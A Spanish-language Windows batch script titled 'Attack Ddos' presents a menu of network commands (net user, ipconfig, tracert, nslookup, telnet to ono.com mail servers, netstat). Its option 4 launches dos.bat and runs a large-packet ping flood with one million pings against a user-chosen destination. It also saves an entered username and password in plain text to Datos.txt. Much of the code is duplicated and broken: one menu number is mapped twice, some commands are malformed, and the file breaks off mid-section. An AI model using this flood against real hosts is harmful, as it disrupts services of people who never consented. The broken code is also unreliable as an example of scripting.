
title Attack Ddos
@echo off
color 0C
color 0C
echo.
@echo off
color C
color C
set Nombre=-------------Luishiño Pericena Choque------------------
echo %Nombre%


echo options
echo.===================================================================
echo. ........11111.1.1111...... 1.  ver los usuarios net user
echo. .....11111111.1.111111.... 2.  verificar la ipconfig/all
echo. ....1111111111.1.111111... 3.  ping		
echo. ...1111111111111.1.11111.. 4.  Attack Ddos	
echo. ...111111111111111.1.111.. 5.  trazar el ping set /p d=tracert
echo. ...1111111111111111.1.1... 6.  DNS publica set /p d=nslookup
echo. .....11111111111111..1.... 7.  set /p d=telnet smtp.ono.com 25
echo. .....11.0..1111..0..11.... 8.  set /p d= telnet pop3.ono.com 110
echo. .....11....1111.....11.... 9.  set /p d=netstat	
echo. .....11111111.11111111.... 10. set /p d=nslookup + set type=ns
echo. ......111111...111111..... 11. set /p d=nslookup + q=mx	
echo. .........111111111........ 12. set /p d=nslookup + set type=all
echo. .........1.1.1.1.1........ 13. Salir 
echo. ........11111111111.......				
echo. .........111111111........						
echo. ..........1111111.........	
echo.===================================================================
echo. ................ ingrese tu users y Password......................
color C


				set users=
				set /p users=Users:
				set /p Password=Password:
				
			
cd "C:\Users\Administrador\Desktop\proyecto\bat\Attack Ddos"			
md DNS
cd "C:\Users\Administrador\Desktop\proyecto\bat\Attack Ddos"
Start voz.vbs


echo.  ::----------------------------------------------------------------::
Echo   :: Bienvenido user: %users%     Fecha:%date%       Hora:%Time% :: 
echo.  ::----------------------------------------------------------------::

msg * Datos registrados
cd "C:\Users\Administrador\Desktop\proyecto\bat\Attack Ddos\DNS"
echo.===================================================================  > Datos.txt
echo. ........11111.1.1111...... 1.  user: %users%   >> Datos.txt
echo. .....11111111.1.111111.... 2.  Password:%Password% >> Datos.txt
echo. ....1111111111.1.111111... 3. Fecha:%date% >> Datos.txt
echo. ...1111111111111.1.11111.. 4.  Hora:%Time% >> Datos.txt
echo. ...111111111111111.1.111.. 5.  trazar el ping set /p d=tracert >> Datos.txt
echo. ...1111111111111111.1.1... 6.  DNS publica set /p d=nslookup >> Datos.txt
echo. .....11111111111111..1.... 7.  set /p d=telnet smtp.ono.com 25 >> Datos.txt
echo. .....11.0..1111..0..11.... 8.  set /p d= telnet pop3.ono.com 110 >> Datos.txt
echo. .....11....1111.....11.... 9.  set /p d=netstat	 >> Datos.txt
echo. .....11111111.11111111.... 10. set /p d=nslookup + set type=ns >> Datos.txt
echo. ......111111...111111..... 11. set /p d=nslookup + q=mx	 >> Datos.txt
echo. .........111111111........ 12. set /p d=nslookup + set type=all >> Datos.txt
echo. .........1.1.1.1.1........ 13. Salir  >> Datos.txt
echo. ........11111111111.......				 >> Datos.txt
echo. .........111111111........				 >> Datos.txt		
echo. ..........1111111.........	 >> Datos.txt
echo.=================================================================== >> Datos.txt

pause


cls
echo.
echo options
echo.===================================================================
echo. ........11111.1.1111...... 1.  ver los usuarios net user
echo. .....11111111.1.111111.... 2.  verificar la ipconfig/all
echo. ....1111111111.1.111111... 3.  hacer ping		
echo. ...1111111111111.1.11111.. 4.  Attack Ddos	
echo. ...111111111111111.1.111.. 5.  trazar el ping set /p d=tracert
echo. ...1111111111111111.1.1... 6.  DNS publica set /p d=nslookup
echo. .....11111111111111..1.... 7.  set /p d=telnet smtp.ono.com 25
echo. .....11.0..1111..0..11.... 8.  set /p d= telnet pop3.ono.com 110
echo. .....11....1111.....11.... 9.  set /p d=netstat	
echo. .....11111111.11111111.... 10. set /p d=nslookup + set type=ns
echo. ......111111...111111..... 11. set /p d=nslookup + q=mx	
echo. .........111111111........ 12. set /p d=nslookup + set type=all
echo. .........1.1.1.1.1........ 13. Salir 
echo. ........11111111111.......				
echo. .........111111111........						
echo. ..........1111111.........	
echo.===================================================================


@echo off
color A
set/p Attack= Escriba el numero determinado y pulse ENTER.
if %Attack%== 1 goto user
if %Attack%== 2 goto ipconfig/all
if %Attack%== 3 goto ping
if %Attack%== 4 goto AttackDdos
if %Attack%== 5 goto tracert
if %Attack%== 6 goto nslookup
if %Attack%== 7 goto telnet25
if %Attack%== 8 goto telnet110
if %Attack%== 9 goto netstat
if %Attack%== 10 goto nslookupsettypens
if %Attack%== 11 goto nslookupqmx
if %Attack%== 7 goto Salir
if %Attack%== %Attack% goto error
pause>nul

color 0C
:user
@echo off 
set /p = net user
net user

cd "C:\Users\Administrador\Desktop\proyecto\bat\Attack Ddos\DNS"
echo.===================================================================  > Datos.txt
echo. ........11111.1.1111...... 1.  user: %users%   >> Datos.txt
echo. .....11111111.1.111111.... 2.  Password:%Password% >> Datos.txt
echo. ....1111111111.1.111111... 3. Fecha:%date% >> Datos.txt
echo. ...1111111111111.1.11111.. 4.  Hora:%Time% >> Datos.txt
echo. ...111111111111111.1.111.. 5.  >> Datos.txt
echo. ...1111111111111111.1.1... 6.   >> Datos.txt
echo. .....11111111111111..1.... 7.  >> Datos.txt
echo. .....11.0..1111..0..11.... 8.  set /p d= telnet pop3.ono.com 110 >> Datos.txt
echo. .....11....1111.....11.... 9.  set /p d=netstat	 >> Datos.txt
echo. .....11111111.11111111.... 10. set /p d=nslookup + set type=ns >> Datos.txt
echo. ......111111...111111..... 11. set /p d=nslookup + q=mx	 >> Datos.txt
echo. .........111111111........ 12. set /p d=nslookup + set type=all >> Datos.txt
echo. .........1.1.1.1.1........ 13. Salir  >> Datos.txt
echo. ........11111111111.......				 >> Datos.txt
echo. .........111111111........				 >> Datos.txt		
echo. ..........1111111.........	 >> Datos.txt
echo.=================================================================== >> Datos.txt


pause
color C
color 0C

echo.
echo options
echo.===================================================================
echo. ........11111.1.1111...... 1.  ver los usuarios net user
echo. .....11111111.1.111111.... 2.  verificar la ipconfig/all
echo. ....1111111111.1.111111... 3.  hacer ping		
echo. ...1111111111111.1.11111.. 4.  Attack Ddos	
echo. ...111111111111111.1.111.. 5.  trazar el ping set /p d=tracert
echo. ...1111111111111111.1.1... 6.  DNS publica set /p d=nslookup
echo. .....11111111111111..1.... 7.  set /p d=telnet smtp.ono.com 25
echo. .....11.0..1111..0..11.... 8.  set /p d= telnet pop3.ono.com 110
echo. .....11....1111.....11.... 9.  set /p d=netstat	
echo. .....11111111.11111111.... 10. set /p d=nslookup + set type=ns
echo. ......111111...111111..... 11. set /p d=nslookup + q=mx	
echo. .........111111111........ 12. set /p d=nslookup + set type=all
echo. .........1.1.1.1.1........ 13. Salir 
echo. ........11111111111.......				
echo. .........111111111........						
echo. ..........1111111.........	
echo.===================================================================


@echo off
color A
set/p Attack= Escriba el numero determinado y pulse ENTER.
if %Attack%== 1 goto user
if %Attack%== 2 goto ipconfig/all
if %Attack%== 3 goto ping
if %Attack%== 4 goto AttackDdos
if %Attack%== 5 goto tracert
if %Attack%== 6 goto nslookup
if %Attack%== 7 goto telnet25
if %Attack%== 8 goto telnet110
if %Attack%== 9 goto nnetstat
if %Attack%== 10 goto nslookupsettypens
if %Attack%== 11 goto nslookupqmx
if %Attack%== 7 goto Salir
if %Attack%== %Attack% goto error
pause>nul
color 0C
:ipconfig/all
set /p d=ipconfig/all
ipconfig %p% %d%

cd "C:\Users\Administrador\Desktop\proyecto\bat\Attack Ddos\DNS"
echo.===================================================================  >> Datos.txt
echo. ........11111.1.1111...... 1.  user: %users%   > Datos.txt
echo. .....11111111.1.111111.... 2.  Password:%Password% >> Datos.txt
echo. ....1111111111.1.111111... 3. Fecha:%date% >> Datos.txt
echo. ...1111111111111.1.11111.. 4.  Hora:%Time% >> Datos.txt
echo. ...111111111111111.1.111.. 5.  ipconfig/all: ipconfig %p% %d% >> Datos.txt
echo. ...1111111111111111.1.1... 6.  DNS publica set /p d=nslookup >> Datos.txt
echo. .....11111111111111..1.... 7.  set /p d=telnet smtp.ono.com 25 >> Datos.txt
echo. .....11.0..1111..0..11.... 8.  set /p d= telnet pop3.ono.com 110 >> Datos.txt
echo. .....11....1111.....11.... 9.  set /p d=netstat	 >> Datos.txt
echo. .....11111111.11111111.... 10. set /p d=nslookup + set type=ns >> Datos.txt
echo. ......111111...111111..... 11. set /p d=nslookup + q=mx	 >> Datos.txt
echo. .........111111111........ 12. set /p d=nslookup + set type=all >> Datos.txt
echo. .........1.1.1.1.1........ 13. Salir  >> Datos.txt
echo. ........11111111111.......				 >> Datos.txt
echo. .........111111111........				 >> Datos.txt		
echo. ..........1111111.........	 >> Datos.txt
echo.=================================================================== >> Datos.txt


pause
color C

color 0C
echo.
echo options
echo.===================================================================
echo. ........11111.1.1111...... 1.  ver los usuarios net user
echo. .....11111111.1.111111.... 2.  verificar la ipconfig/all
echo. ....1111111111.1.111111... 3.  hacer ping		
echo. ...1111111111111.1.11111.. 4.  Attack Ddos	
echo. ...111111111111111.1.111.. 5.  trazar el ping set /p d=tracert
echo. ...1111111111111111.1.1... 6.  DNS publica set /p d=nslookup
echo. .....11111111111111..1.... 7.  set /p d=telnet smtp.ono.com 25
echo. .....11.0..1111..0..11.... 8.  set /p d= telnet pop3.ono.com 110
echo. .....11....1111.....11.... 9.  set /p d=netstat	
echo. .....11111111.11111111.... 10. set /p d=nslookup + set type=ns
echo. ......111111...111111..... 11. set /p d=nslookup + q=mx	
echo. .........111111111........ 12. set /p d=nslookup + set type=all
echo. .........1.1.1.1.1........ 13. Salir 
echo. ........11111111111.......				
echo. .........111111111........						
echo. ..........1111111.........	
echo.===================================================================


@echo off
color A
set/p Attack= Escriba el numero determinado y pulse ENTER.
if %Attack%== 1 goto user
if %Attack%== 2 goto ipconfig/all
if %Attack%== 3 goto ping
if %Attack%== 4 goto AttackDdos
if %Attack%== 5 goto tracert
if %Attack%== 6 goto nslookup
if %Attack%== 7 goto telnet25
if %Attack%== 8 goto telnet110
if %Attack%== 9 goto netstat
if %Attack%== 10 goto nslookupsettypens
if %Attack%== 11 goto nslookupqmx
if %Attack%== 7 goto Salir
if %Attack%== %Attack% goto error
pause>nul

color 0C
:ping
set /p d= ping
ping %p% %d% 

cd "C:\Users\Administrador\Desktop\proyecto\bat\Attack Ddos\DNS"
echo.===================================================================  >> Datos.txt
echo. ........11111.1.1111...... 1.  user: %users%   > Datos.txt
echo. .....11111111.1.111111.... 2.  Password:%Password% >> Datos.txt
echo. ....1111111111.1.111111... 3. Fecha:%date% >> Datos.txt
echo. ...1111111111111.1.11111.. 4.  Hora:%Time% >> Datos.txt
echo. ...111111111111111.1.111.. 5.   ping: %p% %d%>> Datos.txt
echo. ...1111111111111111.1.1... 6.  DNS publica set /p d=nslookup >> Datos.txt
echo. .....11111111111111..1.... 7.  set /p d=telnet smtp.ono.com 25 >> Datos.txt
echo. .....11.0..1111..0..11.... 8.  set /p d= telnet pop3.ono.com 110 >> Datos.txt
echo. .....11....1111.....11.... 9.  set /p d=netstat	 >> Datos.txt
echo. .....11111111.11111111.... 10. set /p d=nslookup + set type=ns >> Datos.txt
echo. ......111111...111111..... 11. set /p d=nslookup + q=mx	 >> Datos.txt
echo. .........111111111........ 12. set /p d=nslookup + set type=all >> Datos.txt
echo. .........1.1.1.1.1........ 13. Salir  >> Datos.txt
echo. ........11111111111.......				 >> Datos.txt
echo. .........111111111........				 >> Datos.txt		
echo. ..........1111111.........	 >> Datos.txt
echo.=================================================================== >> Datos.txt





pause
color C
color 0C
echo.
echo options
echo.===================================================================
echo. ........11111.1.1111...... 1.  ver los usuarios net user
echo. .....11111111.1.111111.... 2.  verificar la ipconfig/all
echo. ....1111111111.1.111111... 3.  hacer ping		
echo. ...1111111111111.1.11111.. 4.  Attack Ddos	
echo. ...111111111111111.1.111.. 5.  trazar el ping set /p d=tracert
echo. ...1111111111111111.1.1... 6.  DNS publica set /p d=nslookup
echo. .....11111111111111..1.... 7.  set /p d=telnet smtp.ono.com 25
echo. .....11.0..1111..0..11.... 8.  set /p d= telnet pop3.ono.com 110
echo. .....11....1111.....11.... 9.  set /p d=netstat	
echo. .....11111111.11111111.... 10. set /p d=nslookup + set type=ns
echo. ......111111...111111..... 11. set /p d=nslookup + q=mx	
echo. .........111111111........ 12. set /p d=nslookup + set type=all
echo. .........1.1.1.1.1........ 13. Salir 
echo. ........11111111111.......				
echo. .........111111111........						
echo. ..........1111111.........	
echo.===================================================================


@echo off
color A
color 0C
set/p Attack= Escriba el numero determinado y pulse ENTER.

if %Attack%== 1 goto user
if %Attack%== 2 goto ipconfig/all
if %Attack%== 3 goto ping
if %Attack%== 4 goto AttackDdos
if %Attack%== 5 goto tracert
if %Attack%== 6 goto nslookup
if %Attack%== 7 goto telnet25
if %Attack%== 8 goto telnet110
if %Attack%== 9 goto netstat
if %Attack%== 10 goto nslookupsettypens
if %Attack%== 11 goto nslookupqmx
if %Attack%== 7 goto Salir
if %Attack%== %Attack% goto error
pause>nul

color 0C

:AttackDdos
set /p d=Destination
set /p p=Packet Size
goto start
:start
rem start http://miip.es/
start dos.bat
ping -t -n 1000000 -l %p% %d%


echo.===================================================================  >> Datos.txt
echo. ........11111.1.1111...... 1.  user: %users%   > Datos.txt
echo. .....11111111.1.111111.... 2.  Password:%Password% >> Datos.txt
echo. ....1111111111.1.111111... 3. Fecha:%date% >> Datos.txt
echo. ...1111111111111.1.11111.. 4.  Hora:%Time% >> Datos.txt
echo. ...111111111111111.1.111.. 5.  trazar el ping set /p d=tracert >> Datos.txt
echo. ...1111111111111111.1.1... 6.  DNS publica set /p d=nslookup >> Datos.txt
echo. .....11111111111111..1.... 7.  set /p d=telnet smtp.ono.com 25 >> Datos.txt
echo. .....11.0..1111..0..11.... 8.  set /p d= telnet pop3.ono.com 110 >> Datos.txt
echo. .....11....1111.....11.... 9.  set /p d=netstat	 >> Datos.txt
echo. .....11111111.11111111.... 10. set /p d=nslookup + set type=ns >> Datos.txt
echo. ......111111...111111..... 11. set /p d=nslookup + q=mx	 >> Datos.txt
echo. .........111111111........ 12. set /p d=nslookup + set type=all >> Datos.txt
echo. .........1.1.1.1.1........ 13. Salir  >> Datos.txt
echo. ........11111111111.......				 >> Datos.txt
echo. .........111111111........				 >> Datos.txt		
echo. ..........1111111.........	 >> Datos.txt
echo.=================================================================== >> Datos.txt
pause


color C
echo.
echo options
echo.===================================================================
echo. ........11111.1.1111...... 1.  ver los usuarios net user
echo. .....11111111.1.111111.... 2.  verificar la ipconfig/all
echo. ....1111111111.1.111111... 3.  hacer ping		
echo. ...1111111111111.1.11111.. 4.  Attack Ddos	
echo. ...111111111111111.1.111.. 5.  trazar el ping set /p d=tracert
echo. ...1111111111111111.1.1... 6.  DNS publica set /p d=nslookup
echo. .....11111111111111..1.... 7.  set /p d=telnet smtp.ono.com 25
echo. .....11.0..1111..0..11.... 8.  set /p d= telnet pop3.ono.com 110
echo. .....11....1111.....11.... 9.  set /p d=netstat	
echo. .....11111111.11111111.... 10. set /p d=nslookup + set type=ns
echo. ......111111...111111..... 11. set /p d=nslookup + q=mx	
echo. .........111111111........ 12. set /p d=nslookup + set type=all
echo. .........1.1.1.1.1........ 13. Salir 
echo. ........11111111111.......				
echo. .........111111111........						
echo. ..........1111111.........	
echo.===================================================================


@echo off
color A
color 0C
set/p Attack= Escriba el numero determinado y pulse ENTER.

if %Attack%== 1 goto user
if %Attack%== 2 goto ipconfig/all
if %Attack%== 3 goto ping
if %Attack%== 4 goto AttackDdos
if %Attack%== 5 goto tracert
if %Attack%== 6 goto nslookup
if %Attack%== 7 goto telnet25
if %Attack%== 8 goto telnet110
if %Attack%== 9 goto netstat
if %Attack%== 10 goto nslookupsettypens
if %Attack%== 11 goto nslookupqmx
if %Attack%== 7 goto Salir
if %Attack%== %Attack% goto error
pause>nul

color 0C
:tracert
set /p d=tracert
tracert %p% %d%


echo.===================================================================  >> Datos.txt
echo. ........11111.1.1111...... 1.  user: %users%   > Datos.txt
echo. .....11111111.1.111111.... 2.  Password:%Password% >> Datos.txt
echo. ....1111111111.1.111111... 3. Fecha:%date% >> Datos.txt
echo. ...1111111111111.1.11111.. 4.  Hora:%Time% >> Datos.txt
echo. ...111111111111111.1.111.. 5.  trazar el ping set /p d=tracert >> Datos.txt
echo. ...1111111111111111.1.1... 6.  DNS publica set /p d=nslookup >> Datos.txt
echo. .....11111111111111..1.... 7.  set /p d=telnet smtp.ono.com 25 >> Datos.txt
echo. .....11.0..1111..0..11.... 8.  set /p d= telnet pop3.ono.com 110 >> Datos.txt
echo. .....11....1111.....11.... 9.  set /p d=netstat	 >> Datos.txt
echo. .....11111111.11111111.... 10. set /p d=nslookup + set type=ns >> Datos.txt
echo. ......111111...111111..... 11. set /p d=nslookup + q=mx	 >> Datos.txt
echo. .........111111111........ 12. set /p d=nslookup + set type=all >> Datos.txt
echo. .........1.1.1.1.1........ 13. Salir  >> Datos.txt
echo. ........11111111111.......				 >> Datos.txt
echo. .........111111111........				 >> Datos.txt		
echo. ..........1111111.........	 >> Datos.txt
echo.=================================================================== >> Datos.txt
pause

color C
color 0C
echo.
echo options
echo.===================================================================
echo. ........11111.1.1111...... 1.  ver los usuarios net user
echo. .....11111111.1.111111.... 2.  verificar la ipconfig/all
echo. ....1111111111.1.111111... 3.  hacer ping		
echo. ...1111111111111.1.11111.. 4.  Attack Ddos	
echo. ...111111111111111.1.111.. 5.  trazar el ping set /p d=tracert
echo. ...1111111111111111.1.1... 6.  DNS publica set /p d=nslookup
echo. .....11111111111111..1.... 7.  set /p d=telnet smtp.ono.com 25
echo. .....11.0..1111..0..11.... 8.  set /p d= telnet pop3.ono.com 110
echo. .....11....1111.....11.... 9.  set /p d=netstat	
echo. .....11111111.11111111.... 10. set /p d=nslookup + set type=ns
echo. ......111111...111111..... 11. set /p d=nslookup + q=mx	
echo. .........111111111........ 12. set /p d=nslookup + set type=all
echo. .........1.1.1.1.1........ 13. Salir 
echo. ........11111111111.......				
echo. .........111111111........						
echo. ..........1111111.........	
echo.===================================================================


@echo off
color A
set/p Attack= Escriba el número determinado y pulse ENTER.


if %Attack%== 1 goto user
if %Attack%== 2 goto ipconfig/all
if %Attack%== 3 goto ping
if %Attack%== 4 goto AttackDdos
if %Attack%== 5 goto tracert
if %Attack%== 6 goto nslookup
if %Attack%== 7 goto telnet25
if %Attack%== 8 goto telnet110
if %Attack%== 9 goto netstat
if %Attack%== 10 goto nslookupsettypens
if %Attack%== 11 goto nslookupqmx
if %Attack%== 7 goto Salir
if %Attack%== %Attack% goto error
pause>nul

color 0C
color 0C

:nslookup
set /p d=nslookup
start cmd
nslookup %p% %d%



echo.===================================================================  >> Datos.txt
echo. ........11111.1.1111...... 1.  user: %users%   > Datos.txt
echo. .....11111111.1.111111.... 2.  Password:%Password% >> Datos.txt
echo. ....1111111111.1.111111... 3. Fecha:%date% >> Datos.txt
echo. ...1111111111111.1.11111.. 4.  Hora:%Time% >> Datos.txt
echo. ...111111111111111.1.111.. 5.  trazar el ping set /p d=tracert >> Datos.txt
echo. ...1111111111111111.1.1... 6.  DNS publica set /p d=nslookup >> Datos.txt
echo. .....11111111111111..1.... 7.  set /p d=telnet smtp.ono.com 25 >> Datos.txt
echo. .....11.0..1111..0..11.... 8.  set /p d= telnet pop3.ono.com 110 >> Datos.txt
echo. .....11....1111.....11.... 9.  set /p d=netstat	 >> Datos.txt
echo. .....11111111.11111111.... 10. set /p d=nslookup + set type=ns >> Datos.txt
echo. ......111111...111111..... 11. set /p d=nslookup + q=mx	 >> Datos.txt
echo. .........111111111........ 12. set /p d=nslookup + set type=all >> Datos.txt
echo. .........1.1.1.1.1........ 13. Salir  >> Datos.txt
echo. ........11111111111.......				 >> Datos.txt
echo. .........111111111........				 >> Datos.txt		
echo. ..........1111111.........	 >> Datos.txt
echo.=================================================================== >> Datos.txt
pause
echo.
echo options
echo.===================================================================
echo. ........11111.1.1111...... 1.  ver los usuarios net user
echo. .....11111111.1.111111.... 2.  verificar la ipconfig/all
echo. ....1111111111.1.111111... 3.  hacer ping		
echo. ...1111111111111.1.11111.. 4.  Attack Ddos	
echo. ...111111111111111.1.111.. 5.  trazar el ping set /p d=tracert
echo. ...1111111111111111.1.1... 6.  DNS publica set /p d=nslookup
echo. .....11111111111111..1.... 7.  set /p d=telnet smtp.ono.com 25
echo. .....11.0..1111..0..11.... 8.  set /p d= telnet pop3.ono.com 110
echo. .....11....1111.....11.... 9.  set /p d=netstat	
echo. .....11111111.11111111.... 10. set /p d=nslookup + set type=ns
echo. ......111111...111111..... 11. set /p d=nslookup + q=mx	
echo. .........111111111........ 12. set /p d=nslookup + set type=all
echo. .........1.1.1.1.1........ 13. Salir 
echo. ........11111111111.......				
echo. .........111111111........						
echo. ..........1111111.........	
echo.===================================================================


@echo off
color A
set/p Attack= Escriba el número determinado y pulse ENTER.


if %Attack%== 1 goto user
if %Attack%== 2 goto ipconfig/all
if %Attack%== 3 goto ping
if %Attack%== 4 goto AttackDdos
if %Attack%== 5 goto tracert
if %Attack%== 6 goto nslookup
if %Attack%== 7 goto telnet25
if %Attack%== 8 goto telnet110
if %Attack%== 9 goto netstat
if %Attack%== 10 goto nslookupsettypens
if %Attack%== 11 goto nslookupqmx
if %Attack%== 7 goto Salir
if %Attack%== %Attack% goto error
pause>nul

color 0C

:telnet25
set /p d=telnet smtp.ono.com 25
telnet telnet pop3.ono.com 25 %p% %d% 


echo.===================================================================  >> Datos.txt
echo. ........11111.1.1111...... 1.  user: %users%   > Datos.txt
echo. .....11111111.1.111111.... 2.  Password:%Password% >> Datos.txt
echo. ....1111111111.1.111111... 3. Fecha:%date% >> Datos.txt
echo. ...1111111111111.1.11111.. 4.  Hora:%Time% >> Datos.txt
echo. ...111111111111111.1.111.. 5.  trazar el ping set /p d=tracert >> Datos.txt
echo. ...1111111111111111.1.1... 6.  DNS publica set /p d=nslookup >> Datos.txt
echo. .....11111111111111..1.... 7.  set /p d=telnet smtp.ono.com 25 >> Datos.txt
echo. .....11.0..1111..0..11.... 8.  set /p d= telnet pop3.ono.com 110 >> Datos.txt
echo. .....11....1111.....11.... 9.  set /p d=netstat	 >> Datos.txt
echo. .....11111111.11111111.... 10. set /p d=nslookup + set type=ns >> Datos.txt
echo. ......111111...111111..... 11. set /p d=nslookup + q=mx	 >> Datos.txt
echo. .........111111111........ 12. set /p d=nslookup + set type=all >> Datos.txt
echo. .........1.1.1.1.1........ 13. Salir  >> Datos.txt
echo. ........11111111111.......				 >> Datos.txt
echo. .........111111111........				 >> Datos.txt		
echo. ..........1111111.........	 >> Datos.txt
echo.=================================================================== >> Datos.txt

pause

color C
echo.
echo options
echo.===================================================================
echo. ........11111.1.1111...... 1.  ver los usuarios net user
echo. .....11111111.1.111111.... 2.  verificar la ipconfig/all
echo. ....1111111111.1.111111... 3.  hacer ping		
echo. ...1111111111111.1.11111.. 4.  Attack Ddos	
echo. ...111111111111111.1.111.. 5.  trazar el ping set /p d=tracert
echo. ...1111111111111111.1.1... 6.  DNS publica set /p d=nslookup
echo. .....11111111111111..1.... 7.  set /p d=telnet smtp.ono.com 25
echo. .....11.0..1111..0..11.... 8.  set /p d= telnet pop3.ono.com 110
echo. .....11....1111.....11.... 9.  set /p d=netstat	
echo. .....11111111.11111111.... 10. set /p d=nslookup + set type=ns
echo. ......111111...111111..... 11. set /p d=nslookup + q=mx	
echo. .........111111111........ 12. set /p d=nslookup + set type=all
echo. .........1.1.1.1.1........ 13. Salir 
echo. ........11111111111.......				
echo. .........111111111........						
echo. ..........1111111.........	
echo.===================================================================

@echo off
color A
set/p Attack= Escriba el número determinado y pulse ENTER.
color 0C

if %Attack%== 1 goto user
if %Attack%== 2 goto ipconfig/all
if %Attack%== 3 goto ping
if %Attack%== 4 goto AttackDdos
if %Attack%== 5 goto tracert
if %Attack%== 6 goto nslookup
if %Attack%== 7 goto telnet25
if %Attack%== 8 goto telnet110
if %Attack%== 9 goto netstat
if %Attack%== 10 goto nslookupsettypens
if %Attack%== 11 goto nslookupqmx
if %Attack%== 7 goto Salir
if %Attack%== %Attack% goto error
pause>nul

color 0C

:telnet110
set /p d= telnet pop3.ono.com 110
Start cmd.exe
telnet pop3.ono.com 110 %p% %d% 


echo.===================================================================  >> Datos.txt
echo. ........11111.1.1111...... 1.  user: %users%   > Datos.txt
echo. .....11111111.1.111111.... 2.  Password:%Password% >> Datos.txt
echo. ....1111111111.1.111111... 3. Fecha:%date% >> Datos.txt
echo. ...1111111111111.1.11111.. 4.  Hora:%Time% >> Datos.txt
echo. ...111111111111111.1.111.. 5.  trazar el ping set /p d=tracert >> Datos.txt
echo. ...1111111111111111.1.1... 6.  DNS publica set /p d=nslookup >> Datos.txt
echo. .....11111111111111..1.... 7.  set /p d=telnet smtp.ono.com 25 >> Datos.txt
echo. .....11.0..1111..0..11.... 8.  set /p d= telnet pop3.ono.com 110 >> Datos.txt
echo. .....11....1111.....11.... 9.  set /p d=netstat	 >> Datos.txt
echo. .....11111111.11111111.... 10. set /p d=nslookup + set type=ns >> Datos.txt
echo. ......111111...111111..... 11. set /p d=nslookup + q=mx	 >> Datos.txt
echo. .........111111111........ 12. set /p d=nslookup + set type=all >> Datos.txt
echo. .........1.1.1.1.1........ 13. Salir  >> Datos.txt
echo. ........11111111111.......				 >> Datos.txt
echo. .........111111111........				 >> Datos.txt		
echo. ..........1111111.........	 >> Datos.txt
echo.=================================================================== >> Datos.txt
pause

color C
echo.
echo options
echo.===================================================================
echo. ........11111.1.1111...... 1.  ver los usuarios net user
echo. .....11111111.1.111111.... 2.  verificar la ipconfig/all
echo. ....1111111111.1.111111... 3.  hacer ping		
echo. ...1111111111111.1.11111.. 4.  Attack Ddos	
echo. ...111111111111111.1.111.. 5.  trazar el ping set /p d=tracert
echo. ...1111111111111111.1.1... 6.  DNS publica set /p d=nslookup
echo. .....11111111111111..1.... 7.  set /p d=telnet smtp.ono.com 25
echo. .....11.0..1111..0..11.... 8.  set /p d= telnet pop3.ono.com 110
echo. .....11....1111.....11.... 9.  set /p d=netstat	
echo. .....11111111.11111111.... 10. set /p d=nslookup + set type=ns
echo. ......111111...111111..... 11. set /p d=nslookup + q=mx	
echo. .........111111111........ 12. set /p d=nslookup + set type=all
echo. .........1.1.1.1.1........ 13. Salir 
echo. ........11111111111.......				
echo. .........111111111........						
echo. ..........1111111.........	
echo.===================================================================






@echo off
color A
set/p Attack= Escriba el número determinado y pulse ENTER.


if %Attack%== 1 goto user
if %Attack%== 2 goto ipconfig/all
if %Attack%== 3 goto ping
if %Attack%== 4 goto AttackDdos
if %Attack%== 5 goto tracert
if %Attack%== 6 goto nslookup
if %Attack%== 7 goto telnet25
if %Attack%== 8 goto telnet110
if %Attack%== 9 goto netstat
if %Attack%== 10 goto nslookupsettypens
if %Attack%== 11 goto nslookupqmx
if %Attack%== 7 goto Salir
if %Attack%== %Attack% goto error
pause>nul

color 0C

:netstat
set /p d=netstat
Start cmd.exe
netstat %p% %d% 
color 0C


echo.===================================================================  >> Datos.txt
echo. ........11111.1.1111...... 1.  user: %users%   > Datos.txt
echo. .....11111111.1.111111.... 2.  Password:%Password% >> Datos.txt
echo. ....1111111111.1.111111... 3. Fecha:%date% >> Datos.txt
echo. ...1111111111111.1.11111.. 4.  Hora:%Time% >> Datos.txt
echo. ...111111111111111.1.111.. 5.  trazar el ping set /p d=tracert >> Datos.txt
echo. ...1111111111111111.1.1... 6.  DNS publica set /p d=nslookup >> Datos.txt
echo. .....11111111111111..1.... 7.  set /p d=telnet smtp.ono.com 25 >> Datos.txt
echo. .....11.0..1111..0..11.... 8.  set /p d= telnet pop3.ono.com 110 >> Datos.txt
echo. .....11....1111.....11.... 9.  set /p d=netstat	 >> Datos.txt
echo. .....11111111.11111111.... 10. set /p d=nslookup + set type=ns >> Datos.txt
echo. ......111111...111111..... 11. set /p d=nslookup + q=mx	 >> Datos.txt
echo. .........111111111........ 12. set /p d=nslookup + set type=all >> Datos.txt
echo. .........1.1.1.1.1........ 13. Salir  >> Datos.txt
echo. ........11111111111.......				 >> Datos.txt
echo. .........111111111........				 >> Datos.txt		
echo. ..........1111111.........	 >> Datos.txt
echo.=================================================================== >> Datos.txt

pause
color C
echo.
echo options
echo.===================================================================
echo. ........11111.1.1111...... 1.  ver los usuarios net user
echo. .....11111111.1.111111.... 2.  verificar la ipconfig/all
echo. ....1111111111.1.111111... 3.  hacer ping		
echo. ...1111111111111.1.11111.. 4.  Attack Ddos	
echo. ...111111111111111.1.111.. 5.  trazar el ping set /p d=tracert
echo. ...1111111111111111.1.1... 6.  DNS publica set /p d=nslookup
echo. .....11111111111111..1.... 7.  set /p d=telnet smtp.ono.com 25
echo. .....11.0..1111..0..11.... 8.  set /p d= telnet pop3.ono.com 110
echo. .....11....1111.....11.... 9.  set /p d=netstat	
echo. .....11111111.11111111.... 10. set /p d=nslookup + set type=ns
echo. ......111111...111111..... 11. set /p d=nslookup + q=mx	
echo. .........111111111........ 12. set /p d=nslookup + set type=all
echo. .........1.1.1.1.1........ 13. Salir 
echo. ........11111111111.......				
echo. .........111111111........						
echo. ..........1111111.........	
echo.===================================================================


@echo off
color A
set/p Attack= Escriba el número determinado y pulse ENTER.


if %Attack%== 1 goto user
if %Attack%== 2 goto ipconfig/all
if %Attack%== 3 goto ping
if %Attack%== 4 goto AttackDdos
if %Attack%== 5 goto tracert
if %Attack%== 6 goto nslookup
if %Attack%== 7 goto telnet25
if %Attack%== 8 goto telnet110
if %Attack%== 9 goto netstat
if %Attack%== 10 goto nslookupsettypens
if %Attack%== 11 goto nslookupqmx

if %Attack%== 12 goto Salir
if %Attack%== %Attack% goto error
pause>nul

color 0C

:nslookupsettypens
set /p d=nslookup + set type=ns
nslookup nslookup+ set type=ns %p% %d%



echo.===================================================================  >> Datos.txt
echo. ........11111.1.1111...... 1.  user: %users%   > Datos.txt
echo. .....11111111.1.111111.... 2.  Password:%Password% >> Datos.txt
echo. ....1111111111.1.111111... 3. Fecha:%date% >> Datos.txt
echo. ...1111111111111.1.11111.. 4.  Hora:%Time% >> Datos.txt
